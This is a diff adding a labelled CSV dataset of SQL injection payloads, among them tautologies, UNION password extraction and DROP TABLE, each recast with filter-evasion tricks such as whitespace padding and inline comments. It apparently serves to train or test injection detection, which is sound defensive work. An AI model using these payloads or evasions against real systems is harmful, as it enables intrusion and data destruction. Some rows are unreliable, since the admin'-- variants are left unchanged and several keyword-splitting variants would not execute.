@@ -1,0 +1,216 @@
+variant_id,original_payload,obfuscated_payload,technique,intensity,Label,obfuscation_level
+WS_00000,' OR 1=1--,' OR   1=1--,excessive_spaces,low,1,simple
+WS_00001,' OR 1=1--,' OR      1=1--,excessive_spaces,medium,1,moderate
+WS_00002,' OR 1=1--,' OR           1=1--,excessive_spaces,high,1,aggressive
+WS_00003,' OR 1=1--,'\tOR\t1=1--,tab_injection,low,1,simple
+WS_00004,' OR 1=1--,'\t\t\tOR\t\t\t1=1--,tab_injection,medium,1,moderate
+WS_00005,' OR 1=1--,'\t\t\t\t\tOR\t\t\t\t\t1=1--,tab_injection,high,1,aggressive
+WS_00006,' OR 1=1--,"' O
+R 1=1--",newline_split,low,1,simple
+WS_00007,' OR 1=1--,"' O
+
+R 1=1--",newline_split,medium,1,moderate
+WS_00008,' OR 1=1--,"' O
+
+
+R 1=1--",newline_split,high,1,aggressive
+WS_00009,' OR 1=1--,"' 
+OR 1=1--",mixed_whitespace,medium,1,moderate
+WS_00010,' OR 1=1--,' O/**/R 1=1--,inline_comment_middle,medium,1,moderate
+WS_00011,' OR 1=1--,' O/**/R 1=1--,inline_comment_after_each_char,high,1,aggressive
+WS_00012,' OR 1=1--,' O/**/R 1=1--,inline_comment_random,medium,1,moderate
+WS_00013,' OR 1=1--,' O/* */R 1=1--,multiline_comment,medium,1,moderate
+WS_00014,' OR 1=1--,' O/*comment*/R 1=1--,multiline_comment,medium,1,moderate
+WS_00015,' OR 1=1--,' O/*evil*/R 1=1--,multiline_comment,medium,1,moderate
+WS_00016,' OR 1=1--,' OR 1=1-- extra comment,dash_comment,low,1,simple
+WS_00017,' OR 1=1--,' OR 1=1--# comment,hash_comment,low,1,simple
+WS_00018,' UNION SELECT NULL--,' UNION   SELECT   NULL--,excessive_spaces,low,1,simple
+WS_00019,' UNION SELECT NULL--,' UNION      SELECT      NULL--,excessive_spaces,medium,1,moderate
+WS_00020,' UNION SELECT NULL--,' UNION           SELECT           NULL--,excessive_spaces,high,1,aggressive
+WS_00021,' UNION SELECT NULL--,'\tUNION\tSELECT\tNULL--,tab_injection,low,1,simple
+WS_00022,' UNION SELECT NULL--,'\t\t\tUNION\t\t\tSELECT\t\t\tNULL--,tab_injection,medium,1,moderate
+WS_00023,' UNION SELECT NULL--,'\t\t\t\t\tUNION\t\t\t\t\tSELECT\t\t\t\t\tNULL--,tab_injection,high,1,aggressive
+WS_00024,' UNION SELECT NULL--,"' UNION SEL
+ECT NULL--",newline_split,low,1,simple
+WS_00025,' UNION SELECT NULL--,"' UNION SEL
+
+ECT NULL--",newline_split,medium,1,moderate
+WS_00026,' UNION SELECT NULL--,"' UNION SEL
+
+
+ECT NULL--",newline_split,high,1,aggressive
+WS_00027,' UNION SELECT NULL--,"'   	UNION 
+SELECT NULL--",mixed_whitespace,medium,1,moderate
+WS_00028,' UNION SELECT NULL--,' UNION SEL/**/ECT NULL--,inline_comment_middle,medium,1,moderate
+WS_00029,' UNION SELECT NULL--,' UNION S/**/E/**/L/**/E/**/C/**/T NULL--,inline_comment_after_each_char,high,1,aggressive
+WS_00030,' UNION SELECT NULL--,' UNION S/**/ELECT NULL--,inline_comment_random,medium,1,moderate
+WS_00031,' UNION SELECT NULL--,' UNION SEL/* */ECT NULL--,multiline_comment,medium,1,moderate
+WS_00032,' UNION SELECT NULL--,' UNION SEL/*comment*/ECT NULL--,multiline_comment,medium,1,moderate
+WS_00033,' UNION SELECT NULL--,' UNION SEL/*evil*/ECT NULL--,multiline_comment,medium,1,moderate
+WS_00034,' UNION SELECT NULL--,' UNION SELECT NULL-- extra comment,dash_comment,low,1,simple
+WS_00035,' UNION SELECT NULL--,' UNION SELECT NULL--# comment,hash_comment,low,1,simple
+WS_00036,admin'--,admin'--,excessive_spaces,low,1,simple
+WS_00037,admin'--,admin'--,excessive_spaces,medium,1,moderate
+WS_00038,admin'--,admin'--,excessive_spaces,high,1,aggressive
+WS_00039,admin'--,admin'--,tab_injection,low,1,simple
+WS_00040,admin'--,admin'--,tab_injection,medium,1,moderate
+WS_00041,admin'--,admin'--,tab_injection,high,1,aggressive
+WS_00042,admin'--,admin'--,newline_split,low,1,simple
+WS_00043,admin'--,admin'--,newline_split,medium,1,moderate
+WS_00044,admin'--,admin'--,newline_split,high,1,aggressive
+WS_00045,admin'--,admin'--,mixed_whitespace,medium,1,moderate
+WS_00046,admin'--,admin'--,inline_comment_middle,medium,1,moderate
+WS_00047,admin'--,admin'--,inline_comment_after_each_char,high,1,aggressive
+WS_00048,admin'--,admin'--,inline_comment_random,medium,1,moderate
+WS_00049,admin'--,admin'--,multiline_comment,medium,1,moderate
+WS_00050,admin'--,admin'--,multiline_comment,medium,1,moderate
+WS_00051,admin'--,admin'--,multiline_comment,medium,1,moderate
+WS_00052,admin'--,admin'-- extra comment,dash_comment,low,1,simple
+WS_00053,admin'--,admin'--# comment,hash_comment,low,1,simple
+WS_00054,1' AND '1'='1,1' AND   '1'='1,excessive_spaces,low,1,simple
+WS_00055,1' AND '1'='1,1' AND      '1'='1,excessive_spaces,medium,1,moderate
+WS_00056,1' AND '1'='1,1' AND           '1'='1,excessive_spaces,high,1,aggressive
+WS_00057,1' AND '1'='1,1'\tAND\t'1'='1,tab_injection,low,1,simple
+WS_00058,1' AND '1'='1,1'\t\t\tAND\t\t\t'1'='1,tab_injection,medium,1,moderate
+WS_00059,1' AND '1'='1,1'\t\t\t\t\tAND\t\t\t\t\t'1'='1,tab_injection,high,1,aggressive
+WS_00060,1' AND '1'='1,"1' A
+ND '1'='1",newline_split,low,1,simple
+WS_00061,1' AND '1'='1,"1' A
+
+ND '1'='1",newline_split,medium,1,moderate
+WS_00062,1' AND '1'='1,"1' A
+
+
+ND '1'='1",newline_split,high,1,aggressive
+WS_00063,1' AND '1'='1,1' 	AND '1'='1,mixed_whitespace,medium,1,moderate
+WS_00064,1' AND '1'='1,1' A/**/ND '1'='1,inline_comment_middle,medium,1,moderate
+WS_00065,1' AND '1'='1,1' A/**/N/**/D '1'='1,inline_comment_after_each_char,high,1,aggressive
+WS_00066,1' AND '1'='1,1' A/**/ND '1'='1,inline_comment_random,medium,1,moderate
+WS_00067,1' AND '1'='1,1' A/* */ND '1'='1,multiline_comment,medium,1,moderate
+WS_00068,1' AND '1'='1,1' A/*comment*/ND '1'='1,multiline_comment,medium,1,moderate
+WS_00069,1' AND '1'='1,1' A/*evil*/ND '1'='1,multiline_comment,medium,1,moderate
+WS_00070,1' AND '1'='1,1' AND '1'='1-- comment,dash_comment,low,1,simple
+WS_00071,1' AND '1'='1,1' AND '1'='1# comment,hash_comment,low,1,simple
+WS_00072,'; DROP TABLE users--,'; DROP   TABLE   users--,excessive_spaces,low,1,simple
+WS_00073,'; DROP TABLE users--,'; DROP      TABLE      users--,excessive_spaces,medium,1,moderate
+WS_00074,'; DROP TABLE users--,'; DROP           TABLE           users--,excessive_spaces,high,1,aggressive
+WS_00075,'; DROP TABLE users--,';\tDROP\tTABLE\tusers--,tab_injection,low,1,simple
+WS_00076,'; DROP TABLE users--,';\t\t\tDROP\t\t\tTABLE\t\t\tusers--,tab_injection,medium,1,moderate
+WS_00077,'; DROP TABLE users--,';\t\t\t\t\tDROP\t\t\t\t\tTABLE\t\t\t\t\tusers--,tab_injection,high,1,aggressive
+WS_00078,'; DROP TABLE users--,"'; DR
+OP TABLE users--",newline_split,low,1,simple
+WS_00079,'; DROP TABLE users--,"'; DR
+
+OP TABLE users--",newline_split,medium,1,moderate
+WS_00080,'; DROP TABLE users--,"'; DR
+
+
+OP TABLE users--",newline_split,high,1,aggressive
+WS_00081,'; DROP TABLE users--,';  DROP  TABLE users--,mixed_whitespace,medium,1,moderate
+WS_00082,'; DROP TABLE users--,'; DR/**/OP TABLE users--,inline_comment_middle,medium,1,moderate
+WS_00083,'; DROP TABLE users--,'; D/**/R/**/O/**/P TABLE users--,inline_comment_after_each_char,high,1,aggressive
+WS_00084,'; DROP TABLE users--,'; D/**/ROP TABLE users--,inline_comment_random,medium,1,moderate
+WS_00085,'; DROP TABLE users--,'; DR/* */OP TABLE users--,multiline_comment,medium,1,moderate
+WS_00086,'; DROP TABLE users--,'; DR/*comment*/OP TABLE users--,multiline_comment,medium,1,moderate
+WS_00087,'; DROP TABLE users--,'; DR/*evil*/OP TABLE users--,multiline_comment,medium,1,moderate
+WS_00088,'; DROP TABLE users--,'; DROP TABLE users-- extra comment,dash_comment,low,1,simple
+WS_00089,'; DROP TABLE users--,'; DROP TABLE users--# comment,hash_comment,low,1,simple
+WS_00090,SELECT * FROM users WHERE id=1,SELECT   * FROM   users WHERE   id=1,excessive_spaces,low,1,simple
+WS_00091,SELECT * FROM users WHERE id=1,SELECT      * FROM      users WHERE      id=1,excessive_spaces,medium,1,moderate
+WS_00092,SELECT * FROM users WHERE id=1,SELECT           * FROM           users WHERE           id=1,excessive_spaces,high,1,aggressive
+WS_00093,SELECT * FROM users WHERE id=1,SELECT\t*\tFROM\tusers\tWHERE\tid=1,tab_injection,low,1,simple
+WS_00094,SELECT * FROM users WHERE id=1,SELECT\t\t\t*\t\t\tFROM\t\t\tusers\t\t\tWHERE\t\t\tid=1,tab_injection,medium,1,moderate
+WS_00095,SELECT * FROM users WHERE id=1,SELECT\t\t\t\t\t*\t\t\t\t\tFROM\t\t\t\t\tusers\t\t\t\t\tWHERE\t\t\t\t\tid=1,tab_injection,high,1,aggressive
+WS_00096,SELECT * FROM users WHERE id=1,"SEL
+ECT * FROM users WHERE id=1",newline_split,low,1,simple
+WS_00097,SELECT * FROM users WHERE id=1,"SEL
+
+ECT * FROM users WHERE id=1",newline_split,medium,1,moderate
+WS_00098,SELECT * FROM users WHERE id=1,"SEL
+
+
+ECT * FROM users WHERE id=1",newline_split,high,1,aggressive
+WS_00099,SELECT * FROM users WHERE id=1,"
+SELECT * 	FROM users 
+WHERE id=1",mixed_whitespace,medium,1,moderate
+WS_00100,SELECT * FROM users WHERE id=1,SEL/**/ECT * FROM users WHERE id=1,inline_comment_middle,medium,1,moderate
+WS_00101,SELECT * FROM users WHERE id=1,S/**/E/**/L/**/E/**/C/**/T * FROM users WHERE id=1,inline_comment_after_each_char,high,1,aggressive
+WS_00102,SELECT * FROM users WHERE id=1,SEL/**/ECT * FROM users WHERE id=1,inline_comment_random,medium,1,moderate
+WS_00103,SELECT * FROM users WHERE id=1,SEL/* */ECT * FROM users WHERE id=1,multiline_comment,medium,1,moderate
+WS_00104,SELECT * FROM users WHERE id=1,SEL/*comment*/ECT * FROM users WHERE id=1,multiline_comment,medium,1,moderate
+WS_00105,SELECT * FROM users WHERE id=1,SEL/*evil*/ECT * FROM users WHERE id=1,multiline_comment,medium,1,moderate
+WS_00106,SELECT * FROM users WHERE id=1,SELECT * FROM users WHERE id=1-- comment,dash_comment,low,1,simple
+WS_00107,SELECT * FROM users WHERE id=1,SELECT * FROM users WHERE id=1# comment,hash_comment,low,1,simple
+WS_00108,UNION SELECT password FROM admins,UNION   SELECT   password FROM   admins,excessive_spaces,low,1,simple
+WS_00109,UNION SELECT password FROM admins,UNION      SELECT      password FROM      admins,excessive_spaces,medium,1,moderate
+WS_00110,UNION SELECT password FROM admins,UNION           SELECT           password FROM           admins,excessive_spaces,high,1,aggressive
+WS_00111,UNION SELECT password FROM admins,UNION\tSELECT\tpassword\tFROM\tadmins,tab_injection,low,1,simple
+WS_00112,UNION SELECT password FROM admins,UNION\t\t\tSELECT\t\t\tpassword\t\t\tFROM\t\t\tadmins,tab_injection,medium,1,moderate
+WS_00113,UNION SELECT password FROM admins,UNION\t\t\t\t\tSELECT\t\t\t\t\tpassword\t\t\t\t\tFROM\t\t\t\t\tadmins,tab_injection,high,1,aggressive
+WS_00114,UNION SELECT password FROM admins,"UNION SEL
+ECT password FROM admins",newline_split,low,1,simple
+WS_00115,UNION SELECT password FROM admins,"UNION SEL
+
+ECT password FROM admins",newline_split,medium,1,moderate
+WS_00116,UNION SELECT password FROM admins,"UNION SEL
+
+
+ECT password FROM admins",newline_split,high,1,aggressive
+WS_00117,UNION SELECT password FROM admins,"	UNION  SELECT password 
+FROM admins",mixed_whitespace,medium,1,moderate
+WS_00118,UNION SELECT password FROM admins,UNION SEL/**/ECT password FROM admins,inline_comment_middle,medium,1,moderate
+WS_00119,UNION SELECT password FROM admins,UNION S/**/E/**/L/**/E/**/C/**/T password FROM admins,inline_comment_after_each_char,high,1,aggressive
+WS_00120,UNION SELECT password FROM admins,UNION SEL/**/ECT password FROM admins,inline_comment_random,medium,1,moderate
+WS_00121,UNION SELECT password FROM admins,UNION SEL/* */ECT password FROM admins,multiline_comment,medium,1,moderate
+WS_00122,UNION SELECT password FROM admins,UNION SEL/*comment*/ECT password FROM admins,multiline_comment,medium,1,moderate
+WS_00123,UNION SELECT password FROM admins,UNION SEL/*evil*/ECT password FROM admins,multiline_comment,medium,1,moderate
+WS_00124,UNION SELECT password FROM admins,UNION SELECT password FROM admins-- comment,dash_comment,low,1,simple
+WS_00125,UNION SELECT password FROM admins,UNION SELECT password FROM admins# comment,hash_comment,low,1,simple
+WS_00126,' OR 'a'='a,' OR   'a'='a,excessive_spaces,low,1,simple
+WS_00127,' OR 'a'='a,' OR      'a'='a,excessive_spaces,medium,1,moderate
+WS_00128,' OR 'a'='a,' OR           'a'='a,excessive_spaces,high,1,aggressive
+WS_00129,' OR 'a'='a,'\tOR\t'a'='a,tab_injection,low,1,simple
+WS_00130,' OR 'a'='a,'\t\t\tOR\t\t\t'a'='a,tab_injection,medium,1,moderate
+WS_00131,' OR 'a'='a,'\t\t\t\t\tOR\t\t\t\t\t'a'='a,tab_injection,high,1,aggressive
+WS_00132,' OR 'a'='a,"' O
+R 'a'='a",newline_split,low,1,simple
+WS_00133,' OR 'a'='a,"' O
+
+R 'a'='a",newline_split,medium,1,moderate
+WS_00134,' OR 'a'='a,"' O
+
+
+R 'a'='a",newline_split,high,1,aggressive
+WS_00135,' OR 'a'='a,'  OR 'a'='a,mixed_whitespace,medium,1,moderate
+WS_00136,' OR 'a'='a,' O/**/R 'a'='a,inline_comment_middle,medium,1,moderate
+WS_00137,' OR 'a'='a,' O/**/R 'a'='a,inline_comment_after_each_char,high,1,aggressive
+WS_00138,' OR 'a'='a,' O/**/R 'a'='a,inline_comment_random,medium,1,moderate
+WS_00139,' OR 'a'='a,' O/* */R 'a'='a,multiline_comment,medium,1,moderate
+WS_00140,' OR 'a'='a,' O/*comment*/R 'a'='a,multiline_comment,medium,1,moderate
+WS_00141,' OR 'a'='a,' O/*evil*/R 'a'='a,multiline_comment,medium,1,moderate
+WS_00142,' OR 'a'='a,' OR 'a'='a-- comment,dash_comment,low,1,simple
+WS_00143,' OR 'a'='a,' OR 'a'='a# comment,hash_comment,low,1,simple
+WS_00144,1' ORDER BY 1--,1' ORDER   BY 1--,excessive_spaces,low,1,simple
+WS_00145,1' ORDER BY 1--,1' ORDER      BY 1--,excessive_spaces,medium,1,moderate
+WS_00146,1' ORDER BY 1--,1' ORDER           BY 1--,excessive_spaces,high,1,aggressive
+WS_00147,1' ORDER BY 1--,1'\tORDER\tBY\t1--,tab_injection,low,1,simple
+WS_00148,1' ORDER BY 1--,1'\t\t\tORDER\t\t\tBY\t\t\t1--,tab_injection,medium,1,moderate
+WS_00149,1' ORDER BY 1--,1'\t\t\t\t\tORDER\t\t\t\t\tBY\t\t\t\t\t1--,tab_injection,high,1,aggressive
+WS_00150,1' ORDER BY 1--,"1' OR
+DER BY 1--",newline_split,low,1,simple
+WS_00151,1' ORDER BY 1--,"1' OR
+
+DER BY 1--",newline_split,medium,1,moderate
+WS_00152,1' ORDER BY 1--,"1' OR
+
+
+DER BY 1--",newline_split,high,1,aggressive
+WS_00153,1' ORDER BY 1--,1' 	ORDER BY 1--,mixed_whitespace,medium,1,moderate
+WS_00154,1' ORDER BY 1--,1' OR/**/DER BY 1--,inline_comment_middle,medium,1,moderate
+WS_00155,1' ORDER BY 1--,1' O/**/R/**/D/**/E/**/R BY 1--,inline_comment_after_each_char,high,1,aggressive
+WS_00156,1' ORDER BY 1--,1' ORDE/**/R BY 1--,inline_comment_random,medium,1,moderate
+WS_00157,1' ORDER BY 1--,1' OR/* */DER BY 1--,multiline_comment,medium,1,moderate
+WS_00158,1' ORDER BY 1--,1' OR/*comment*/DER BY 1--,multiline_comment,medium,1,moderate
+WS_00159,1' ORDER BY 1--,1' OR/*evil*/DER BY 1--,multiline_comment,medium,1,moderate
+WS_00160,1' ORDER BY 1--,1' ORDER BY 1-- extra comment,dash_comment,low,1,simple
+WS_00161,1' ORDER BY 1--,1' ORDER BY 1--# comment,hash_comment,low,1,simple
